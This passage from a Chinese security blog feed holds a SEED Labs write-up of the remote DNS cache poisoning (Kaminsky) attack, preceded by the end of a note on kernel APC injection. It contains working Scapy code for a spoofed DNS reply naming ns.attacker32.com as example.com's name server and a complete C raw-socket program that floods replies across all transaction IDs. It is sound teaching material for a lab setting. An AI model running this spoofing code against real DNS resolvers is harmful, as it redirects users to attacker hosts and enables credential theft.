id="内核模式apc注入">6.2 内核模式APC注入</h2><ul><li>设备驱动函数主要利用两个函数：KeInitializeAPC和KeInsertQueueAPC。</li><li>KeInitializeAPC初始化一个KAPC结构，传递参数给KeInsertQueueAPC，将APC对象放到目标线程相应的APC队列中。</li></ul><p>参考教程：</p><ol type="1"><li><ahref="https://xz.aliyun.com/t/10318">关于几种dll注入方式的学习</a></li></ol>]]></content>
    
    
    <categories>
      
      <category>恶意代码分析</category>
      
      <category>理论篇</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>The Kaminsky Attack</title>
    <link href="/2023/11/29/SEED-LABS/Network%20Security/The%20Kaminsky%20Attack/"/>
    <url>/2023/11/29/SEED-LABS/Network%20Security/The%20Kaminsky%20Attack/</url>
    
    <content type="html"><![CDATA[<h1 id="lab-overview">1. Lab Overview</h1><p>本实验的目的是让学生获得远程 DNS 缓存中毒攻击（也称为 Kaminsky DNS攻击）的第一手经验。DNS（域名系统）是互联网的电话簿；它将主机名转换为 IP地址，反之亦然。这种转换是通过在幕后进行的 DNS 解析完成的。DNS攻击以各种方式操纵这一解析过程，目的是将用户误导到其他目的地，而这些目的地往往是恶意的。本实验室重点研究一种特殊的DNS 攻击技术，即 DNS 缓存中毒攻击。在另一个 SEED实验室中，我们设计了在本地网络环境中进行相同攻击的活动，即攻击者和受害者DNS服务器在同一网络中，可以进行数据包嗅探。在远程攻击实验室中，数据包嗅探是不可能的，因此攻击比本地攻击更具挑战性。本实验室涵盖以下主题：</p><ul><li>DNS 及其工作原理</li><li>DNS 服务器设置</li><li>DNS 缓存中毒攻击</li><li>欺骗 DNS 响应</li><li>数据包欺骗</li></ul><h1 id="lab-environment-setuptask1">2. Lab Environment Setup(Task1)</h1><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311291103586.png"alt="image-20231129105011202" /><figcaption aria-hidden="true">image-20231129105011202</figcaption></figure><p>基本配置同本地DNS攻击</p><h1 id="the-attack-tasks">3. The Attack Tasks</h1><p>DNS 攻击的主要目的是，当用户尝试使用 A 主机名访问 A主机时，将用户重定向到另一台机器 B。例如，假设 www.example.com是一个网上银行网站，当用户使用正确的网址 www.example.com试图访问该网站时，如果对手能将用户重定向到一个与 www.example.com非常相似的恶意网站，用户就可能上当受骗，并将自己的凭据泄露给攻击者。</p><p>在本任务中，我们使用域名 www.example.com作为攻击目标。需要注意的是，example.com域名仅用于文档编写，而非任何真实公司。www.example.com 的真实 IP 地址为93.184.216.34，其名称服务器由 Internet 名称与数字地址分配机构 (ICANN)管理。当用户在该名称上运行 dig命令或在浏览器中键入该名称时，用户的机器会向其本地 DNS 服务器发送 DNS查询，最终会从 example.com 的名称服务器请求 IP 地址。</p><p>攻击的目的是对本地 DNS 服务器发起 DNS 缓存中毒攻击，这样当用户运行dig 命令查找 www.example.com 的 IP 地址时，本地 DNS服务器最终会转到攻击者的名称服务器 ns.attacker32.com 来获取 IP地址，这样返回的IP地址可以是攻击者决定的任何数字。结果，用户将被引导到攻击者的网站，而不是真实的<a href="http://www.example.com">www.example.com</a>。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311291103587.png"alt="image-20231129105141034" /><figcaption aria-hidden="true">image-20231129105141034</figcaption></figure><h2 id="how-kaminsky-attack-works">3.1 How Kaminsky attack works</h2><p>在这项任务中，攻击者向受害者 DNS 服务器（Apollo）发送 DNS查询请求，触发 Apollo 的 DNS 查询。查询可能会经过其中一个根 DNS服务器、.COM DNS 服务器，最终结果将从 example.com 的 DNS服务器返回。如上图所示。如果 example.com 的域名服务器信息已被 Apollo缓存，查询将不会通过根服务器或 .COM服务器；如下图所示。在本实验室中，下图所示的情况更为常见，因此我们将以此图为基础描述攻击机制。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311291103588.png"alt="image-20231129105250433" /><figcaption aria-hidden="true">image-20231129105250433</figcaption></figure><p>当 Apollo 等待来自 example.com 名称服务器的 DNS 回复时，攻击者可以向Apollo 发送伪造回复，假装这些回复来自 example.com的名称服务器。如果伪造的回复先到达，Apollo 就会接受。攻击就会成功。</p><p>如果您做过我们的本地 DNS 攻击实验，就应该知道这些攻击假定攻击者和 DNS服务器位于同一局域网，即攻击者可以观察到 DNS 查询报文。当攻击者和 DNS服务器不在同一局域网上时，缓存中毒攻击就会变得更加困难。造成这种困难的主要原因是 DNS 响应数据包中的事务 ID必须与查询数据包中的事务 ID 一致。由于查询中的事务 ID通常是随机生成的，在没有看到查询数据包的情况下，攻击者不容易知道正确的ID。</p><p>显然，攻击者可以猜出交易 ID。由于 ID 的大小只有 16位，如果攻击者能在攻击窗口内（即在合法响应到达之前）伪造 K个响应，成功的概率是K 超过2^16。发送数百个伪造回复并非不切实际，因此攻击者不需要尝试太多就能成功。</p><p>然而，上述假设攻击忽略了缓存效应。在现实中，如果攻击者没有足够的运气在真正的响应数据包到达之前做出正确的猜测，正确的信息就会被DNS服务器缓存一段时间。这种缓存效应使攻击者无法伪造有关同一名称的另一个响应，因为DNS 服务器不会在缓存超时之前再次发出有关该名称的 DNS查询。要伪造对同一名称的另一次响应，攻击者必须等待对该名称的另一次 DNS查询，这意味着他/她必须等待缓存超时。等待时间可以是数小时或数天。</p><p><strong>卡明斯基攻击</strong>：Dan Kaminsky提出了一种优雅的技术来击败缓存效应。 使用 Kaminsky攻击，攻击者就可以连续攻击域名上的 DNS服务器，无需等待，因此攻击可以在很短的时间内成功。在本任务中，我们将尝试这种攻击方法。攻击步骤：</p><ol type="1"><li>攻击者通过 DNS 服务器 Apollo 查询 example.com 中不存在的名称，如twysw.example.com，其中 twysw 是一个随机名称。</li><li>由于该映射在 Apollo 的 DNS 缓存中不可用，Apollo 会向 example.com域名的名称服务器发送 DNS 查询。</li><li>在 Apollo 等待回复的同时，攻击者向 Apollo 灌入大量欺骗性 DNS响应，每次都尝试不同的事务ID，希望其中一个是正确的。在响应中，攻击者不仅提供了 twysw.example.com的 IP 解析，还提供了 "授权名称服务器 "记录，显示 ns.attacker32.com 是example.com 域名的名称服务器。如果欺骗响应与实际响应相同，且事务ID与查询中的事务 ID 相匹配，Apollo 将接受并缓存欺骗答案，从而使 Apollo的 DNS 缓存中毒。</li><li>即使欺骗的 DNS 响应失败（例如，事务 ID不匹配或响应太晚），也没有关系，因为下一次，攻击者会查询不同的名称，因此Apollo必须再发送一次查询，给攻击者再一次进行欺骗攻击的机会。这就有效地破坏了缓存效果。</li><li>如果攻击成功，在 Apollo 的 DNS 缓存中，example.com的名称服务器将被攻击者的名称服务器 ns.attacker32.com代替。要证明攻击成功，学生需要证明 Apollo 的 DNS缓存中存在这样一条记录。</li></ol><p>任务概述。实现卡明斯基攻击是一项相当具有挑战性的任务，因此我们将其分解为几个子任务。在任务2 中，我们为 example.com 域中的一个随机主机名构建 DNS 请求。在任务 3中，我们从 example.com 的名称服务器构建一个欺骗的 DNS 回复。在任务 4中，我们将所有内容整合在一起，发起卡明斯基攻击。最后，在任务 5中，我们将验证攻击的影响。</p><h2 id="task-2-construct-dns-request">3.2 Task 2: Construct DNSrequest</h2><p>这项任务的重点是发送 DNS 请求。为了完成攻击，攻击者需要触发目标 DNS服务器发送 DNS 查询，这样他们就有机会欺骗 DNS回复。由于攻击者需要多次尝试才能成功，因此最好使用程序自动完成这一过程。</p><p>学生需要编写一个程序，向目标 DNS 服务器（即我们设置中的本地 DNS服务器）发送 DNS 查询。学生的任务是编写该程序并演示（使用Wireshark）他们的查询可以触发目标 DNS 服务器发送相应的 DNS查询。这项任务对性能的要求不高，因此学生可以使用 C 或 Python（使用Scapy）编写这段代码。Python代码片段如下（+++为占位符，学生需要用实际值替换）：</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311291103589.png"alt="image-20231129105421475" /><figcaption aria-hidden="true">image-20231129105421475</figcaption></figure><p><strong>实验过程：</strong></p><ol type="1"><li><p>编写代码：使用Scapy库构建了一个DNS请求数据包，目标域名为'kkk.example.com'，并通过UDP协议发送到目标IP地址'10.9.0.53'的53号端口。目标域名可为*.example.com；实际场景中DNS中id为随机值。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/bin/env python3</span><br><span class="hljs-keyword">from</span> scapy.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># 创建DNS查询部分，指定查询域名为&#x27;kkk.example.com&#x27;</span><br>Qdsec = DNSQR(qname=<span class="hljs-string">&#x27;kkk.example.com&#x27;</span>)<br><br><span class="hljs-comment"># 创建DNS消息，设置ID为0xAAAA，查询计数为1，回答计数、授权计数和附加记录计数均为0</span><br>dns = DNS(<span class="hljs-built_in">id</span>=<span class="hljs-number">0xAAAA</span>, qr=<span class="hljs-number">0</span>, qdcount=<span class="hljs-number">1</span>, ancount=<span class="hljs-number">0</span>, nscount=<span class="hljs-number">0</span>, arcount=<span class="hljs-number">0</span>, qd=Qdsec)<br><br><span class="hljs-comment"># 创建IP数据包，指定目标IP地址为&#x27;10.9.0.53&#x27;，源IP地址为&#x27;10.9.0.5&#x27;</span><br>ip = IP(dst=<span class="hljs-string">&#x27;10.9.0.53&#x27;</span>, src=<span class="hljs-string">&#x27;10.9.0.5&#x27;</span>)<br><br><span class="hljs-comment"># 创建UDP数据包，指定目标端口为53，源端口为12345，校验和为0</span><br>udp = UDP(dport=<span class="hljs-number">53</span>, sport=<span class="hljs-number">12345</span>, chksum=<span class="hljs-number">0</span>)<br><br><span class="hljs-comment"># 组合数据包，顺序为IP头部 / UDP头部 / DNS消息</span><br>request = ip / udp / dns<br><br><span class="hljs-comment"># 发送构建的DNS请求数据包</span><br>send(request)<br></code></pre></td></tr></table></figure></li><li><p>开启wireshark监听，运行代码，成功触发本地DNS服务器发出相应的DNS查询。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311291103590.png"alt="image-20231129105529577" /><figcaption aria-hidden="true">image-20231129105529577</figcaption></figure></li></ol><h2 id="task-3-spoof-dns-replies">3.3 Task 3: Spoof DNS Replies</h2><p>在本任务中，我们需要在 Kaminsky 攻击中欺骗 DNS 回复。由于我们的目标是example.com，因此需要欺骗该域名的名称服务器的回复。学生们首先需要找出example.com 的合法名称服务器的 IP地址（需要注意的是，该域名有多个名称服务器）。</p><p>学生可以使用 Scapy 来完成这项任务。下面的代码片段构建了一个 DNS响应包，其中包括问题部分、答案部分和 NS 部分。在示例代码中，我们使用 +++作为占位符；学生需要用卡明斯基攻击中所需的正确值替换它们。学生需要解释为什么选择这些值。</p><p>由于这种回复本身并不能导致攻击成功，要演示这项任务，学生需要使用Wireshark 捕获欺骗的 DNS 回复，并证明欺骗的数据包是有效的。</p><p><strong>实验流程：</strong></p><ol type="1"><li><p>查询example.com 的合法名称服务器的 IP 地址</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311291103591.png"alt="image-20231129105637553" /><figcaption aria-hidden="true">image-20231129105637553</figcaption></figure></li><li><p>编写代码:ns为攻击者DNS服务器，目标IP为本地DNS服务器IP，目标端口为33333（环境配置中本地DNS服务器DNS查询使用的端口固定为33333）,因为需要伪造成合法名称服务器，所以源IP使用example.com的合法名称服务器的 IP 地址之一即可，源端口使用53。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/bin/env python3</span><br><span class="hljs-keyword">from</span> scapy.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> *<br><br>name = <span class="hljs-string">&#x27;www.example.com&#x27;</span>  <span class="hljs-comment"># 攻击目标域名</span><br>domain = <span class="hljs-string">&#x27;example.com&#x27;</span>  <span class="hljs-comment"># 攻击目标域名的父域名</span><br>ns = <span class="hljs-string">&#x27;ns.attacker32.com&#x27;</span>  <span class="hljs-comment"># 恶意名称服务器</span><br>Qdsec = DNSQR(qname=name)<br>Anssec = DNSRR(rrname=name, <span class="hljs-built_in">type</span>=<span class="hljs-string">&#x27;A&#x27;</span>, rdata=<span class="hljs-string">&#x27;1.2.3.4&#x27;</span>, ttl=<span class="hljs-number">259200</span>)<br>NSsec = DNSRR(rrname=domain, <span class="hljs-built_in">type</span>=<span class="hljs-string">&#x27;NS&#x27;</span>, rdata=ns, ttl=<span class="hljs-number">259200</span>)<br>dns = DNS(<span class="hljs-built_in">id</span>=<span class="hljs-number">0xAAAA</span>, aa=<span class="hljs-number">1</span>, rd=<span class="hljs-number">1</span>, qr=<span class="hljs-number">1</span>,<br>          qdcount=<span class="hljs-number">1</span>, ancount=<span class="hljs-number">1</span>, nscount=<span class="hljs-number">1</span>, arcount=<span class="hljs-number">0</span>,<br>          qd=Qdsec, an=Anssec, ns=NSsec)<br>ip = IP(dst=<span class="hljs-string">&#x27;10.9.0.53&#x27;</span>, src=<span class="hljs-string">&#x27;199.43.133.53&#x27;</span>)  <br>udp = UDP(dport=<span class="hljs-number">33333</span>, sport=<span class="hljs-number">53</span>, chksum=<span class="hljs-number">0</span>) <br>reply = ip/udp/dns<br>send(reply)<br></code></pre></td></tr></table></figure></li><li><p>开启wireshark监听，运行程序，成功捕获到伪造的响应数据包。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311291103592.png"alt="image-20231129105736769" /><figcaption aria-hidden="true">image-20231129105736769</figcaption></figure></li></ol><h2 id="task-4-launch-the-kaminsky-attack">3.4 Task 4: Launch theKaminsky Attack</h2><p>现在，我们可以将所有内容整合在一起，实施卡明斯基攻击。在攻击中，我们需要发送许多欺骗性的DNS回复，希望其中一个回复能命中正确的事务编号，并比合法回复更快到达。因此，速度至关重要：发送的数据包越多，成功率就越高。如果使用Scapy 发送欺骗的 DNS 回复，成功率就会太低。学生可以使用 C 语言，但用 C语言构建 DNS 数据包并非易事。我们引入了一种同时使用 Scapy 和 C语言的混合方法（详见 SEED 书籍）。</p><p>在混合方法中，我们首先使用 Scapy 生成 DNS数据包模板，并将其存储在一个文件中。然后，我们将该模板加载到 C语言程序中，并对部分字段稍作修改，然后发送数据包。我们在Labsetup/Files/attack.c 中提供了一个 C代码骨架。代码的详细解释见指南部分。</p><p>检查 DNS 缓存。要检查攻击是否成功，我们需要检查 dump.db 文件，查看DNS 服务器是否成功接受了我们的欺骗 DNS 响应。以下命令将转储 DNS缓存，并搜索缓存中是否包含单词 attacker（在我们的攻击中，我们使用attacker32.com作为攻击者的域名；如果学生使用不同的域名，则应搜索不同的单词）。</p><p><code>rndc dumpdb -cache &amp;&amp; grep attacker /var/cache/bind/dump.db</code></p><p><strong>实验流程：</strong></p><ol type="1"><li><p>将task2和task3构建的数据包保存为二进制文件</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311291103594.png"alt="image-20231129105936728" /><figcaption aria-hidden="true">image-20231129105936728</figcaption></figure></li><li><p>编写攻击代码：通过触发本地DNS服务器对一个example.com的随机子域名发起DNS请求，然后攻击者针对此域名查询发送DNS响应包，如果命中真实ID的伪造响应包在真实数据包前先到达，则成功实现DNS缓存投毒攻击。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;arpa/inet.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;time.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_FILE_SIZE 1000000</span><br><br><span class="hljs-comment">/* IP 头部 */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ipheader</span> &#123;</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>      iph_ihl:<span class="hljs-number">4</span>, <span class="hljs-comment">// IP 头部长度</span><br>                     iph_ver:<span class="hljs-number">4</span>; <span class="hljs-comment">// IP 版本</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>      iph_tos; <span class="hljs-comment">// 服务类型</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> <span class="hljs-type">int</span> iph_len; <span class="hljs-comment">// IP 数据包长度（数据 + 头部）</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> <span class="hljs-type">int</span> iph_ident; <span class="hljs-comment">// 标识</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> <span class="hljs-type">int</span> iph_flag:<span class="hljs-number">3</span>, <span class="hljs-comment">// 分片标志</span><br>                     iph_offset:<span class="hljs-number">13</span>; <span class="hljs-comment">// 分片偏移</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>      iph_ttl; <span class="hljs-comment">// 存活时间</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>      iph_protocol; <span class="hljs-comment">// 协议类型</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> <span class="hljs-type">int</span> iph_chksum; <span class="hljs-comment">// IP 数据报校验和</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span>  <span class="hljs-title">in_addr</span>    <span class="hljs-title">iph_sourceip</span>;</span> <span class="hljs-comment">// 源 IP 地址 </span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span>  <span class="hljs-title">in_addr</span>    <span class="hljs-title">iph_destip</span>;</span>   <span class="hljs-comment">// 目标 IP 地址 </span><br>&#125;;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">send_raw_packet</span><span class="hljs-params">(<span class="hljs-type">char</span> * buffer, <span class="hljs-type">int</span> pkt_size)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">send_dns_request</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> * buffer, <span class="hljs-type">int</span> pkt_size, <span class="hljs-type">char</span> * name)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">send_dns_response</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> * buffer, <span class="hljs-type">int</span> pkt_size, <span class="hljs-type">char</span> * name, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> id)</span>;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>  srand(time(<span class="hljs-literal">NULL</span>));<br>  FILE * f_req = fopen(<span class="hljs-string">&quot;request.bin&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>);<br>  <span class="hljs-keyword">if</span> (!f_req) &#123;<br>     perror(<span class="hljs-string">&quot;无法打开 &#x27;request.bin&#x27;&quot;</span>);<br>     <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>  &#125;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> requset[MAX_FILE_SIZE];<br>  <span class="hljs-type">int</span> n_req = fread(requset, <span class="hljs-number">1</span>, MAX_FILE_SIZE, f_req);<br>  FILE * f_resp = fopen(<span class="hljs-string">&quot;reply.bin&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>);<br>  <span class="hljs-keyword">if</span> (!f_resp) &#123;<br>     perror(<span class="hljs-string">&quot;无法打开 &#x27;reply.bin&#x27;&quot;</span>);<br>     <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>  &#125;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> reply[MAX_FILE_SIZE];<br>  <span class="hljs-type">int</span> n_resp = fread(reply, <span class="hljs-number">1</span>, MAX_FILE_SIZE, f_resp);<br><br>  <span class="hljs-type">char</span> a[<span class="hljs-number">26</span>] = <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyz&quot;</span>;<br>  <span class="hljs-type">char</span> name[<span class="hljs-number">6</span>];<br>  <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br>    <span class="hljs-comment">// 生成长度为 5 的随机名称</span><br>    <span class="hljs-built_in">memset</span>(name, <span class="hljs-number">0</span>, <span class="hljs-number">5</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> k = <span class="hljs-number">0</span>; k &lt; <span class="hljs-number">5</span>; k++)  <br>      name[k] = a[rand() % <span class="hljs-number">26</span>];<br>    send_dns_request(requset, n_req, name);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;请求 %s.example.com\n&quot;</span>, name);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">65535</span>; i++) &#123;<br>      send_dns_response(reply, n_resp, name, i);<br>    &#125;<br>  &#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">send_dns_request</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> * buffer, <span class="hljs-type">int</span> pkt_size, <span class="hljs-type">char</span> * name)</span> &#123;<br>  <span class="hljs-built_in">memcpy</span>(buffer + <span class="hljs-number">41</span>, (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>*)name, <span class="hljs-number">5</span>);<br>  send_raw_packet(buffer, pkt_size);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">send_dns_response</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> * buffer, <span class="hljs-type">int</span> pkt_size, <span class="hljs-type">char</span> * name, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> id)</span> &#123;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> tmp[<span class="hljs-number">2</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>  *tmp = htons(id);<br>  <span class="hljs-built_in">memcpy</span>(buffer + <span class="hljs-number">28</span>, (<span class="hljs-type">void</span>*)tmp, <span class="hljs-number">2</span>);  <br>  <span class="hljs-built_in">memcpy</span>(buffer + <span class="hljs-number">41</span>, (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>*)name, <span class="hljs-number">5</span>);<br>  <span class="hljs-built_in">memcpy</span>(buffer + <span class="hljs-number">64</span>, (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>*)name, <span class="hljs-number">5</span>);<br>  send_raw_packet(buffer, pkt_size);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">send_raw_packet</span><span class="hljs-params">(<span class="hljs-type">char</span> * buffer, <span class="hljs-type">int</span> pkt_size)</span> &#123;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> <span class="hljs-title">dest_info</span>;</span><br>  <span class="hljs-type">int</span> enable = <span class="hljs-number">1</span>;<br><br>  <span class="hljs-comment">// 步骤 1：创建原始网络套接字。</span><br>  <span class="hljs-type">int</span> sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);<br><br>  <span class="hljs-comment">// 步骤 2：设置套接字选项。</span><br>  setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &amp;enable, <span class="hljs-keyword">sizeof</span>(enable));<br><br>  <span class="hljs-comment">// 步骤 3：提供有关目标的必要信息。</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ipheader</span> *<span class="hljs-title">ip</span> =</span> (<span class="hljs-keyword">struct</span> ipheader *) buffer;<br>  dest_info.sin_family = AF_INET;<br>  dest_info.sin_addr = ip-&gt;iph_destip;<br><br>  <span class="hljs-comment">// 步骤 4：发送数据包。</span><br>  sendto(sock, buffer, pkt_size, <span class="hljs-number">0</span>, (<span class="hljs-keyword">struct</span> sockaddr *)&amp;dest_info, <span class="hljs-keyword">sizeof</span>(dest_info));<br>  close(sock);<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>编译运行攻击代码，一段时间后查看缓存记录，成功实现投毒攻击。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311291103595.png"alt="image-20231129110057918" /><figcaption aria-hidden="true">image-20231129110057918</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311291103596.png"alt="image-20231129110110331" /><figcaption aria-hidden="true">image-20231129110110331</figcaption></figure></li></ol><h2 id="task-5-result-verification">2.5 Task 5: Result Verification</h2><p>如果攻击成功，在本地 DNS 服务器的 DNS 缓存中，example.com 的 NS记录将变成 ns.attacker32.com。当该服务器收到 example.com域内任何主机名的 DNS 查询时，它将向 ns.attacker32.com发送查询，而不是发送到该域的合法名称服务器。</p><p>要验证攻击是否成功，请访问用户机器，运行以下两条 dig命令。在两个命令的响应中，www.example.com 的 IP地址应相同，并且应与攻击者名称服务器上的区域文件中包含的地址相同。</p><p>请在实验报告中附上您的观察结果（截图），并解释您认为攻击成功的原因。特别是，在运行第一个dig 命令时，请使用 Wireshark 捕捉网络流量，并指出该 dig命令触发了哪些数据包。使用数据包跟踪来证明你的攻击是成功的。请注意，运行第一个dig 命令后，DNS 结果可能会缓存在本地 DNS 服务器上。您可以在本地 DNS服务器上使用 "sudo rndc flush "清除缓存，但这需要重新进行攻击。</p><p><strong>实验过程：</strong></p><ol type="1"><li><p>运行<code>dig www.example.com</code>:返回1.2.3.5。查询过程：用户-&gt;本地DNS服务器；本地DNS服务器-&gt;攻击者服务器。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311291103597.png"alt="image-20231129110205945" /><figcaption aria-hidden="true">image-20231129110205945</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311291103598.png"alt="image-20231129110216900" /><figcaption aria-hidden="true">image-20231129110216900</figcaption></figure></li><li><p>清除本地DNS服务器缓存，再次发起攻击，等待攻击成功。</p></li><li><p>运行<code>dig @ns.attacker32.com www.example.com</code>：返回1.2.3.5。查询过程：用户-&gt;本地DNS服务器；本地DNS服务器-&gt;用户（返回攻击者服务器地址）；用户-&gt;攻击者DNS服务器。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311291103599.png"alt="image-20231129110247918" /><figcaption aria-hidden="true">image-20231129110247918</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311291103600.png"alt="image-20231129110258933" /><figcaption 